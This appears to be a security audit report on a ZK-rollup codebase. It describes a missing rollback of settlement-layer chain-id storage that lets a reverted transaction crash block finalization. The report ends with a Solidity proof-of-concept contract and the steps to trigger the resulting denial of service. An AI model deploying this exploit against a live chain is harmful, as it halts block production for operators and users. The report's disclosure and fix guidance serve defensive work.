### Title
`new_settlement_layer_chain_id_storage` Excluded from IO Frame Rollback, Causing Block-Finalization Panic on Reverted SL Chain-ID Update - (`basic_system/src/system_implementation/system/io_subsystem.rs`)

---

### Summary

`FullIOStateSnapshot` omits `new_settlement_layer_chain_id_storage` from its snapshot fields, and `finish_io_frame` never calls `new_settlement_layer_chain_id_storage.finish_frame()` during a rollback. When any execution frame that triggers `update_settlement_layer_chain_id` is subsequently reverted, the persistent storage slot in `SystemContext` is correctly rolled back while `new_settlement_layer_chain_id_storage` retains the new value. Block finalization then asserts these two values are equal and panics, preventing the block from being finalized.

---

### Finding Description

`FullIO` holds six sub-storages. Five of them are snapshotted and rolled back together: [1](#0-0) 

```rust
pub struct FullIOStateSnapshot<M: StorageModel> {
    io: M::StateSnapshot,
    transient: CacheSnapshotId,
    messages: usize,
    events: usize,
    interop_roots: usize,
    // ← new_settlement_layer_chain_id is ABSENT
}
```

`finish_io_frame` rolls back all five tracked sub-storages but never touches `new_settlement_layer_chain_id_storage`: [2](#0-1) 

Yet `NewSettlementLayerChainIdStorage` *does* expose `start_frame` / `finish_frame` methods that are simply never wired in: [3](#0-2) 

The write path is: any EVM `LOG` instruction whose first topic matches `SL_CHAIN_ID_UPDATED_EVENT_SIG` and has exactly two topics with empty data triggers `system_context_event_hook`, which calls `update_settlement_layer_chain_id` unconditionally — with no check on the emitting contract's address: [4](#0-3) 

Block finalization reads both values and asserts they agree: [5](#0-4) 

If the transaction that emitted the event is reverted, `SystemContext` slot 0 is rolled back to the old chain-id, but `new_settlement_layer_chain_id_storage` still holds the new value. The `assert_eq!` panics and the block cannot be finalized.

---

### Impact Explanation

**State-transition bug / valid-execution unprovability.** A single reverted transaction that emits `SettlementLayerChainIdUpdated` leaves `new_settlement_layer_chain_id_storage` permanently diverged from the on-chain storage value for the rest of the block. Block finalization unconditionally asserts equality between the two; the panic aborts the entire block, making it impossible to produce a valid state transition or ZK proof for that block. This is a liveness-breaking / block-sealing denial-of-service.

---

### Likelihood Explanation

The event hook checks only the event signature and topic count — not the emitting address: [6](#0-5) 

Any unprivileged EVM contract can emit a two-topic `SettlementLayerChainIdUpdated(uint256)` log with empty data, trigger the hook, and then revert. The revert rolls back the event from `events_storage` but leaves `new_settlement_layer_chain_id_storage` permanently dirty. The attacker needs only to deploy a contract and send one transaction; no privileged role is required.

Even without the address-filter gap, a legitimate service transaction that updates the SL chain-id and then fails the post-execution pubdata check (a known revert path in the ZK transaction flow) would trigger the same inconsistency: [7](#0-6) 

---

### Recommendation

Add `new_settlement_layer_chain_id_storage` to `FullIOStateSnapshot` and wire it into `finish_io_frame`, mirroring the pattern used for every other sub-storage:

```rust
pub struct FullIOStateSnapshot<M: StorageModel> {
    io: M::StateSnapshot,
    transient: CacheSnapshotId,
    messages: usize,
    events: usize,
    interop_roots: usize,
    new_sl_chain_id: NewSettlementLayerChainIdSnapshotId, // add this
}
```

```rust
fn finish_io_frame(&mut self, rollback_handle: Option<&Self::StateSnapshot>) -> Result<(), InternalError> {
    // ... existing rollbacks ...
    self.new_settlement_layer_chain_id_storage
        .finish_frame(rollback_handle.map(|x| x.new_sl_chain_id)); // add this
    Ok(())
}
```

Additionally, restrict `system_context_event_hook` to only fire when the emitting address is the canonical `SYSTEM_CONTEXT_ADDRESS`, preventing unprivileged contracts from triggering the hook.

---

### Proof of Concept

1. Deploy contract `Exploit`:
   ```solidity
   contract Exploit {
       // keccak256("SettlementLayerChainIdUpdated(uint256)")
       bytes32 constant SIG = 0x208daf0b9291c1e9a1697737d736630c808045f81f5bc5ae7b8ed740eb5a4d7a;
       function run(uint256 newId) external {
           assembly {
               mstore(0, newId)
               // LOG1 with 2 topics, 0 data bytes
               log2(0, 0, SIG, newId)
               revert(0, 0)   // revert after emitting
           }
       }
   }
   ```
2. Send a transaction calling `Exploit.run(999)`.
3. The `system_context_event_hook` fires during `emit_event`, writing `999` into `new_settlement_layer_chain_id_storage`.
4. The `revert` causes `finish_io_frame(Some(&rollback_handle))`: `events_storage` rolls back the event; `new_settlement_layer_chain_id_storage` is **not** rolled back.
5. Block finalization calls `read_batch_context_inputs`:
   - `read_settlement_layer_chain_id` reads `SystemContext` slot 0 → old value (e.g., `1`)
   - `new_settlement_layer_chain_id_storage.value()` → `Some(999)`
   - `assert_eq!(999, 1)` → **panic** → block cannot be finalized. [8](#0-7) [9](#0-8) [5](#0-4)

### Citations

**File:** basic_system/src/system_implementation/system/io_subsystem.rs (L39-67)
```rust
pub struct FullIO<
    A: Allocator + Clone + Default,
    R: Resources,
    P: StorageAccessPolicy<R, Bytes32>,
    SF: StackFactory<N>,
    const N: usize,
    O: IOOracle,
    M: StorageModel<IOTypes = EthereumIOTypesConfig, Resources = R, InitData = P, Allocator = A>,
    const PROOF_ENV: bool,
> {
    pub storage: M,
    pub transient_storage: GenericTransientStorage<WarmStorageKey, Bytes32, SF, N, A>,
    pub logs_storage: LogsStorage<SF, N, A>,
    pub events_storage: EventsStorage<MAX_EVENT_TOPICS, SF, N, A>,
    pub interop_root_storage: InteropRootStorage<SF, N, A>,
    pub new_settlement_layer_chain_id_storage: NewSettlementLayerChainIdStorage<SF, N, A>,
    pub allocator: A,
    pub oracle: O,
    pub tx_number: u32,
    pub da_commitment_scheme: Option<DACommitmentScheme>,
}

pub struct FullIOStateSnapshot<M: StorageModel> {
    io: M::StateSnapshot,
    transient: CacheSnapshotId,
    messages: usize,
    events: usize,
    interop_roots: usize,
}
```

**File:** basic_system/src/system_implementation/system/io_subsystem.rs (L418-433)
```rust
    fn finish_io_frame(
        &mut self,
        rollback_handle: Option<&Self::StateSnapshot>,
    ) -> Result<(), InternalError> {
        self.storage.finish_frame(rollback_handle.map(|x| &x.io))?;
        self.transient_storage
            .finish_frame(rollback_handle.map(|x| &x.transient))?;
        self.logs_storage
            .finish_frame(rollback_handle.map(|x| x.messages));
        self.events_storage
            .finish_frame(rollback_handle.map(|x| x.events));
        self.interop_root_storage
            .finish_frame(rollback_handle.map(|x| x.interop_roots));

        Ok(())
    }
```

**File:** zk_ee/src/common_structs/new_settlement_layer_chain_id_storage.rs (L37-62)
```rust
    pub fn start_frame(&mut self) -> NewSettlementLayerChainIdSnapshotId {
        self.history.snapshot()
    }

    pub fn update(&mut self, new_sl_chain_id: U256) -> Result<(), SystemError> {
        if self.value().is_some() {
            return Err(internal_error!(
                "Tried to update settlement layer chain id more than once in a block"
            )
            .into());
        }
        self.history.update(new_sl_chain_id);

        Ok(())
    }

    pub fn value(&self) -> Option<&U256> {
        self.history.value()
    }

    #[track_caller]
    pub fn finish_frame(&mut self, rollback_handle: Option<NewSettlementLayerChainIdSnapshotId>) {
        if let Some(x) = rollback_handle {
            self.history.rollback(x);
        }
    }
```

**File:** system_hooks/src/event_hooks/system_context.rs (L18-67)
```rust
pub fn system_context_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    if topics.is_empty() {
        return Ok(());
    }
    // For now, we only capture the SettlementLayerChainIdUpdated event
    if topics[0].as_u8_array() == SL_CHAIN_ID_UPDATED_EVENT_SIG {
        new_sl_chain_id_event_hook(topics, data, caller_ee, system, resources)
    } else {
        Ok(())
    }
}

fn new_sl_chain_id_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    // Internal error if the data supplied isn't empty
    if !data.is_empty() {
        return Err(
            internal_error!("New SL chain id reporter event hook received bad data").into(),
        );
    }
    // Same if there's a mismatch in expected topics
    if topics.len() != 2 {
        return Err(
            internal_error!("New SL chain id reporter event hook received bad topics").into(),
        );
    }

    let new_sl_chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    system.io.update_settlement_layer_chain_id(
        ExecutionEnvironmentType::NoEE,
        resources,
        new_sl_chain_id,
    )?;

    Ok(())
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/post_tx_op/mod.rs (L231-241)
```rust
) -> (Bytes32, U256) {
    let multichain_root = read_multichain_root(io);
    let settlement_layer_chain_id = read_settlement_layer_chain_id(io);
    if let Some(new_settlement_layer_chain_id) = io.new_settlement_layer_chain_id_storage.value() {
        // If the SL chain id was updated, make sure the updated one matches
        // the one read from storage.
        assert_eq!(new_settlement_layer_chain_id, &settlement_layer_chain_id);
    }

    (multichain_root, settlement_layer_chain_id)
}
```

**File:** basic_bootloader/src/bootloader/transaction_flow/zk/mod.rs (L886-897)
```rust
        if !has_enough {
            execution_result = execution_result.to_reverted();
            system_log!(system, "Not enough gas for pubdata after execution\n");
            // Burn all remaining ergs.
            context.resources.main_resources.exhaust_ergs();
            Ok((
                execution_result.to_reverted(),
                CachedPubdataInfo {
                    pubdata_used,
                    to_charge_for_pubdata,
                },
            ))
```
